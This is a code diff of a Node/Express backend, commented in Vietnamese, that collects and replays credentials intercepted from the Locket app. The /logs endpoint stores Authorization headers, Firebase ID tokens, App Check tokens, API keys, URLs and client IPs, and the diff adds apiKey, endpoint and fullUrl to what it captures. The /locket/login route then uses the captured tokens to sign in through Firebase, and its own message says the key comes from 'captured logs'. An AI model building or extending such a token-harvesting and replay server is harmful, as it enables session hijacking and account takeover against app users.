@@ -10,30 +10,52 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// In-memory storage + file backup
-let logsData = [];
-const LOG_FILE = '/tmp/locket_logs.txt';
+// Thư mục lưu logs
+const LOGS_DIR = path.join(__dirname, 'logs');
 
-// Hàm đọc logs
-const readLogs = () => logsData;
+// Tạo thư mục logs nếu chưa có
+if (!fs.existsSync(LOGS_DIR)) {
+  fs.mkdirSync(LOGS_DIR, { recursive: true });
+}
 
-// Hàm ghi logs (memory + file)
-const writeLogs = (logs) => {
-  logsData = logs;
-  // Ghi ra file txt
+// Hàm đọc tất cả logs từ thư mục
+const readLogs = () => {
   try {
-    const logText = logs.map(log => {
-      return `[${log.timestamp}] App: ${log.app}\n` +
-             `  Authorization: ${log.authorization || 'N/A'}\n` +
-             `  FirebaseToken: ${log.firebaseToken || 'N/A'}\n` +
-             `  AppCheck: ${log.appCheck || 'N/A'}\n` +
-             `  UserAgent: ${log.userAgent || 'N/A'}\n` +
-             `  IP: ${log.ip || 'N/A'}\n` +
-             `-------------------------------------------`;
-    }).join('\n\n');
-    fs.writeFileSync(LOG_FILE, logText, 'utf8');
+    const files = fs.readdirSync(LOGS_DIR).filter(f => f.endsWith('.json'));
+    const logs = files.map(file => {
+      const content = fs.readFileSync(path.join(LOGS_DIR, file), 'utf8');
+      return JSON.parse(content);
+    });
+    // Sắp xếp theo timestamp mới nhất
+    return logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
   } catch (e) {
-    console.error('[WRITE FILE ERROR]', e.message);
+    console.error('[READ LOGS ERROR]', e.message);
+    return [];
+  }
+};
+
+// Hàm ghi 1 log entry ra file riêng
+const writeLog = (logEntry) => {
+  try {
+    const filename = `${logEntry.id}_${logEntry.app.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
+    const filepath = path.join(LOGS_DIR, filename);
+    fs.writeFileSync(filepath, JSON.stringify(logEntry, null, 2), 'utf8');
+    return true;
+  } catch (e) {
+    console.error('[WRITE LOG ERROR]', e.message);
+    return false;
+  }
+};
+
+// Hàm xóa tất cả logs
+const clearLogs = () => {
+  try {
+    const files = fs.readdirSync(LOGS_DIR).filter(f => f.endsWith('.json'));
+    files.forEach(file => fs.unlinkSync(path.join(LOGS_DIR, file)));
+    return true;
+  } catch (e) {
+    console.error('[CLEAR LOGS ERROR]', e.message);
+    return false;
   }
 };
 
@@ -46,7 +68,10 @@ app.post('/logs', (req, res) => {
       firebaseToken, 
       appCheck, 
       userAgent,
-      timestamp 
+      timestamp,
+      apiKey,
+      endpoint,
+      fullUrl
     } = req.body;
     
     // Lấy IP thực từ request
@@ -63,13 +88,14 @@ app.post('/logs', (req, res) => {
       firebaseToken: firebaseToken || null,
       appCheck: appCheck || null,
       userAgent: userAgent || req.headers['user-agent'] || null,
+      apiKey: apiKey || null,
+      endpoint: endpoint || null,
+      fullUrl: fullUrl || null,
       ip: realIP
     };
 
-    // Đọc logs hiện tại và thêm mới
-    const logs = readLogs();
-    logs.push(logEntry);
-    writeLogs(logs);
+    // Ghi log ra file riêng
+    writeLog(logEntry);
 
     console.log(`[LOG] New entry from ${appName} - IP: ${realIP}`);
 
@@ -139,7 +165,7 @@ app.delete('/logs', (req, res) => {
     });
   }
 
-  writeLogs([]);
+  clearLogs();
   res.json({
     success: true,
     message: 'All logs cleared'
@@ -172,10 +198,16 @@ app.post('/locket/login', async (req, res) => {
       });
     }
 
+    if (!apiKey) {
+      return res.status(400).json({
+        success: false,
+        message: 'Missing apiKey. Lấy từ logs đã capture hoặc từ app bundle.'
+      });
+    }
+
     // Extract token (remove "Bearer " prefix if present)
     const idToken = authorization.replace('Bearer ', '');
     
-    // Dùng apiKey từ request hoặc default
     const FIREBASE_API_KEY = apiKey;
 
     // Gọi Firebase Identity Toolkit API
